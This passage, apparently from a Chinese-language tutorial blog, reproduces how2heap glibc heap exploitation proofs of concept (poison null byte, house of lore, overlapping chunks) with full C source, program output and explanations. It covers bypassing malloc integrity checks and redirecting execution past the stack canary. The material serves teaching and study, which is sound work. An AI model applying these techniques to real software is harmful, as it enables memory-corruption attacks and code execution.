</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;d: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>d</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now &#39;d&#39; and &#39;b2&#39; overlap.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>d</span><span class=p>,</span><span class=sc>&#39;D&#39;</span><span class=p>,</span><span class=mh>0x300</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;New b2 content:</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>b2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;for the clear explanation of this technique.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>Welcome to poison null byte 2.0!
Tested in Ubuntu 14.04 64bit.
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.
We allocate 0x100 bytes for &#39;a&#39;.
a: 0x19e6010
Since we want to overflow &#39;a&#39;, we need to know the &#39;real&#39; size of &#39;a&#39; (it may be more than 0x100 because of rounding): 0x108
b: 0x19e6120
c: 0x19e6330
We allocate a barrier at 0x19e6440, so that c is not consolidated with the top-chunk when freed.
The barrier is not strictly necessary, but makes things less confusing
In newer versions of glibc we will need to have our updated size inside b itself to pass the check &#39;chunksize(P) != prev_size (next_chunk(P))&#39;
b.size: 0x211
b.size is: (0x200 + 0x10) | prev_in_use
We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;
b.size: 0x200
c.prev_size is 0x210
We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
b1: 0x19e6120
Now we malloc &#39;b1&#39;. It will be placed where &#39;b&#39; was. At this point c.prev_size should have been updated, but it was not: 0x210
Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
We malloc &#39;b2&#39;, our &#39;victim&#39; chunk.
b2: 0x19e6230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Now we free &#39;b1&#39; and &#39;c&#39;: this will consolidate the chunks &#39;b1&#39; and &#39;c&#39; (forgetting about&#39;b2&#39;).
Finally, we allocate &#39;d&#39;, overlapping &#39;b2&#39;.
d: 0x19e6120
Now &#39;d&#39; and &#39;b2&#39; overlap.
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.
</code></pre><p>这里的漏洞很简单，就是 off-by-null，通过 <code>a</code> 溢出了一字节到已经被释放了的 <code>b</code>，使得 <code>b</code> 的 <code>chunk_size</code> 被改变。这里需要注意的是，新版本 glibc 增加了检验机制，如果 <code>chunksize(P) != prev_size (next_chunk(P))</code> 则会报错，那么如何绕过呢？</p><p>我们知道 P 是指 chunk 指针，也就是 <code>b-0x10</code>，那么 <code>b-0x8</code> 就是这里的 <code>chunksize(P)</code>，被 off-by-null 后变成 0x200。而 <code>next_chunk(P)</code> 则为 <code>b-0x10+0x200 = b+0x1f0</code>。所以 <code>prev_size(next_chunk(P))</code> 实际上就是 <code>*(b+0x1f0)</code>。那么我们提前修改 <code>b+0x1f0 = 0x200</code> 既绕过了验证。</p><p>随后申请了 0x100 的 b1，位于原来 b 的位置上，这时原本应该更新的是 <code>c</code> 的 <code>prev_size</code>，但是由于我们刚才说的 <code>prev_size(next_chunk(P))</code> 等于 <code>*(b+0x1f0)</code>，实际上被更新的位置是 <code>b+0x1f0</code>，也就是 <code>c.prev_size - 0x10</code>。换句话说，<code>c</code> 依然认为它前面的块的大小是 0x210。</p><p>于是我们在 <code>b1</code> 下面申请 0x80 的 <code>b2</code>，尽管它被夹在 <code>b1</code> 和 <code>c</code> 中间，当我们释放 <code>b1</code> 和 <code>c</code> 时两者依旧会合并，但我们依然控制着 <code>b2</code> 指针！这个时候申请 0x300 的 <code>d</code>，它还是会被放到 <code>b1</code> 的位置，那么通过 <code>d</code> 就可以完全控制 <code>b2</code> 这个 chunk。</p><h2 id=house_of_lore class="relative group">house_of_lore <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#house_of_lore aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>Advanced exploitation of the House of Lore - Malloc Maleficarum.
</span></span></span><span class=line><span class=cl><span class=cm>This PoC take care also of the glibc hardening of smallbin corruption.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>[...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>else
</span></span></span><span class=line><span class=cl><span class=cm>    {
</span></span></span><span class=line><span class=cl><span class=cm>      bck = victim-&gt;bk;
</span></span></span><span class=line><span class=cl><span class=cm>    if (__glibc_unlikely (bck-&gt;fd != victim)){
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>                  errstr = &#34;malloc(): smallbin double linked list corrupted&#34;;
</span></span></span><span class=line><span class=cl><span class=cm>                  goto errout;
</span></span></span><span class=line><span class=cl><span class=cm>                }
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       set_inuse_bit_at_offset (victim, nb);
</span></span></span><span class=line><span class=cl><span class=cm>       bin-&gt;bk = bck;
</span></span></span><span class=line><span class=cl><span class=cm>       bck-&gt;fd = bin;
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       [...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>jackpot</span><span class=p>(){</span> <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Nice jump d00d&#34;</span><span class=p>);</span> <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>intptr_t</span><span class=o>*</span> <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=kt>intptr_t</span><span class=o>*</span> <span class=n>stack_buffer_2</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Welcome to the House of Lore</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This is a revisited version that bypass also the hardening check introduced by glibc malloc</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating the victim chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>victim</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocated the first small chunk on the heap at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>victim_chunk</span> <span class=o>=</span> <span class=n>victim</span><span class=o>-</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_buffer_1 at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>stack_buffer_1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_buffer_2 at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>stack_buffer_2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Create a fake chunk on the stack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&#34;</span>
</span></span><span class=line><span class=cl>         <span class=s>&#34;in second to the last malloc, which putting stack address on smallbin list</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>victim_chunk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &#34;</span>
</span></span><span class=line><span class=cl>         <span class=s>&#34;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake&#34;</span>
</span></span><span class=line><span class=cl>         <span class=s>&#34;chunk on stack&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>intptr_t</span><span class=o>*</span><span class=p>)</span><span class=n>stack_buffer_2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer_2</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>intptr_t</span><span class=o>*</span><span class=p>)</span><span class=n>stack_buffer_1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating another large chunk in order to avoid consolidating the top chunk with&#34;</span>
</span></span><span class=line><span class=cl>         <span class=s>&#34;the small one during the free()</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>p5</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocated the large chunk on the heap at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the chunk %p, it will be inserted in the unsorted bin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>free</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>In the unsorted bin the victim&#39;s fwd and bk pointers are nil</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;victim-&gt;fwd: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;victim-&gt;bk: %p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now performing a malloc that can&#39;t be handled by the UnsortedBin, nor the small bin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This means that the chunk %p will be inserted in front of the SmallBin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>p2</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>1200</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The chunk that can&#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The victim chunk has been sorted and its fwd and bk pointers updated</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;victim-&gt;fwd: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;victim-&gt;bk: %p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>victim</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>//------------VULNERABILITY-----------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>victim</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>intptr_t</span><span class=p>)</span><span class=n>stack_buffer_1</span><span class=p>;</span> <span class=c1>// victim-&gt;bk is pointing to stack
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>//------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now allocating a chunk with size equal to the first one freed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>p3</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>p4</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 = malloc(100)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>The fwd pointer of stack_buffer_2 has changed after the last malloc to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>         <span class=n>stack_buffer_2</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>p4 is %p and should be on the stack!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p4</span><span class=p>);</span> <span class=c1>// this chunk will be allocated on stack
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>intptr_t</span> <span class=n>sc</span> <span class=o>=</span> <span class=p>(</span><span class=kt>intptr_t</span><span class=p>)</span><span class=n>jackpot</span><span class=p>;</span> <span class=c1>// Emulating our in-memory shellcode
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>memcpy</span><span class=p>((</span><span class=n>p4</span><span class=o>+</span><span class=mi>40</span><span class=p>),</span> <span class=o>&amp;</span><span class=n>sc</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span> <span class=c1>// This bypasses stack-smash detection since it jumps over the canary
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>Welcome to the House of Lore
This is a revisited version that bypass also the hardening check introduced by glibc malloc
This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23

Allocating the victim chunk
Allocated the first small chunk on the heap at 0x2006010
stack_buffer_1 at 0x7ffd3c0b7460
stack_buffer_2 at 0x7ffd3c0b7440
Create a fake chunk on the stack
Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
Allocated the large chunk on the heap at 0x2006080
Freeing the chunk 0x2006010, it will be inserted in the unsorted bin

In the unsorted bin the victim&#39;s fwd and bk pointers are nil
victim-&gt;fwd: (nil)
victim-&gt;bk: (nil)

Now performing a malloc that can&#39;t be handled by the UnsortedBin, nor the small bin
This means that the chunk 0x2006010 will be inserted in front of the SmallBin
The chunk that can&#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x2006470
The victim chunk has been sorted and its fwd and bk pointers updated
victim-&gt;fwd: 0x7fddc3aecbd8
victim-&gt;bk: 0x7fddc3aecbd8

Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk
p4 = malloc(100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fddc3aecbd8

p4 is 0x7ffd3c0b7470 and should be on the stack!
Nice jump d00d
</code></pre><p>逻辑还是比较简单的，就是通过修改栈变量以及堆上 small chunk <code>victim</code> 的 <code>bk</code> 指针构造出一条完整的双向链表，以通过 small bin 检查从而使得 <code>malloc</code> 返回一个栈上地址。注意中间关键的一步是申请了一个不能被 unsorted bin 和 small bin 满足的 chunk，因此只能从 top chunk 切割，这时原本在 unsorted bin 中的 <code>victim</code> 就进入了 small bin。</p><h2 id=overlapping_chunks class="relative group">overlapping_chunks <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#overlapping_chunks aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm> A simple tale of overlapping chunk.
</span></span></span><span class=line><span class=cl><span class=cm> This technique is taken from
</span></span></span><span class=line><span class=cl><span class=cm> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span> <span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>p1</span><span class=p>,</span><span class=o>*</span><span class=n>p2</span><span class=p>,</span><span class=o>*</span><span class=n>p3</span><span class=p>,</span><span class=o>*</span><span class=n>p4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>This is a simple chunks overlapping problem</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s start to allocate 3 chunks on the heap</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>p3</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x80</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The 3 chunks have been allocated here:</span><span class=se>\n</span><span class=s>p1=%p</span><span class=se>\n</span><span class=s>p2=%p</span><span class=se>\n</span><span class=s>p3=%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>,</span> <span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span><span class=sc>&#39;1&#39;</span><span class=p>,</span> <span class=mh>0x100</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
